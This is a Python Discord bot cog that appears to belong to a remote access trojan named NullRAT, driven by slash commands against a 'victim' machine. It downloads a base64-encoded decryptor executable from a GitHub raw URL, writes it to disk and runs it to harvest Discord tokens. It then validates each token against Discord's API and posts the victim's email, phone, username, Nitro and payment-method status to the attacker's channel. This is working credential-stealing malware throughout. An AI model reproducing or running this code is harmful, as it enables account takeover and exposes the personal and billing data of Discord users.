from typing import List

import disnake as discord
from disnake.ext import commands
from datetime import datetime
from base64 import decodebytes

import os, requests
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class CheckedTokens(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.slash_command( )
    async def checked_tokens(self, ctx, victim):
        """Decrypts and checks all Discord Tokens

        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        """
        if str(victim) != str(self.bot.identifier):
            return
        await ctx.response.defer()
        try:
            tkr = bytes(requests.get("https://raw.githubusercontent.com/NullCode13-Misc/DiscordTokenDecrypt-Go/main/rec_dump_broken").text, "utf-8")
        except Exception as e:
            return await ctx.followup.send("Unable to download custom decryptor!\n\n"+e)

        os.chdir(nr_working)
        with open("tkr.exe", "wb") as fh: fh.write(decodebytes(tkr))
        discord_tokenz = str(os.popen("tkr.exe").read()).strip('][').split(', ')

        valid, email, phone, uname, nitro, bill, avatar, dcTks, idq = [], [], [], [], [], [], [], [], []
        dcTks.extend(a.replace('"','') for a in discord_tokenz)

        webTks = self.bot.find_token()
        finalTks = list(dict.fromkeys(dcTks + webTks))

        for token in finalTks:
            headers = {'Authorization': token, 'Content-Type': 'application/json'}
            requ = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)

            if requ.status_code == 401: 
                await ctx.channel.send(embed=discord.Embed(title="Token is invalid!",description=token))
                continue
            if requ.status_code == 200:
                valid.append( str(token) )
                json = requ.json()
                email.append( str(json['email']) )
                phone.append( str(json['phone']) )
                idq.append(   str(json["id"])   )
                uname.append( f'{json["username"]}#{json["discriminator"]}' )
                avatar.append(f"https://cdn.discordapp.com/avatars/{str(json['id'])}/{str(json['avatar'])}" )
                nitro.append(
                    str(
                        len(
                            requests.get(
                                'https://discordapp.com/api/v6/users/@me/billing/subscriptions',
                                headers=headers,
                            ).json()
                        )
                        > 0
                    )
                )
                bill.append(
                    str(
                        len(
                            requests.get(
                                'https://discordapp.com/api/v6/users/@me/billing/payment-sources',
                                headers=headers,
                            ).json()
                        )
                        > 0
                    )
                )
        if not valid: 
            return await ctx.followup.send(embed = self.bot.genEmbed("No valid Discord Tokens", datetime.now()))
        embeds = [
            self.bot.checked_embeds(tk, em, ph, un, ni, bi, av, idqa)
            for tk, em, ph, un, ni, bi, av, idqa in zip(
                valid, email, phone, uname, nitro, bill, avatar, idq
            )
        ]
        if len(embeds) <= 1: await ctx.channel.send(embed=embeds[0])
        else: await ctx.channel.send(embed=embeds[0], view=Menu(embeds))

        await ctx.followup.send("Checked all tokens")
            
            
class Menu(discord.ui.View):
    def __init__(self, embeds: List[discord.Embed]):
        super().__init__(timeout=None)
        self.embeds = embeds
        self.embed_count = 0

        self.first_page.disabled = True
        self.prev_page.disabled = True

        for i, embed in enumerate(self.embeds):
            embed.set_footer(text=f"Page {i + 1} of {len(self.embeds)} | Checked by NullRAT")

    @discord.ui.button(label="<< First", style=discord.ButtonStyle.blurple)
    async def first_page(self, button: discord.ui.Button, interaction: discord.MessageInteraction):
        self.embed_count = 0
        embed = self.embeds[self.embed_count]
        embed.set_footer(text=f"Page 1 of {len(self.embeds)}")

        self.first_page.disabled = True
        self.prev_page.disabled = True
        self.next_page.disabled = False
        self.last_page.disabled = False
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="< Previous", style=discord.ButtonStyle.secondary)
    async def prev_page(self, button: discord.ui.Button, interaction: discord.MessageInteraction):
        self.embed_count -= 1
        embed = self.embeds[self.embed_count]

        self.next_page.disabled = False
        self.last_page.disabled = False
        if self.embed_count == 0:
            self.first_page.disabled = True
            self.prev_page.disabled = True
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="Next >", style=discord.ButtonStyle.secondary)
    async def next_page(self, button: discord.ui.Button, interaction: discord.MessageInteraction):
        self.embed_count += 1
        embed = self.embeds[self.embed_count]

        self.first_page.disabled = False
        self.prev_page.disabled = False
        if self.embed_count == len(self.embeds) - 1:
            self.next_page.disabled = True
            self.last_page.disabled = True
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="Last >>", style=discord.ButtonStyle.blurple)
    async def last_page(self, button: discord.ui.Button, interaction: discord.MessageInteraction):
        self.embed_count = len(self.embeds) - 1
        embed = self.embeds[self.embed_count]

        self.first_page.disabled = False
        self.prev_page.disabled = False
        self.next_page.disabled = True
        self.last_page.disabled = True
        await interaction.response.edit_message(embed=embed, view=self)

def setup(bot: commands.Bot):
    bot.add_cog(CheckedTokens(bot))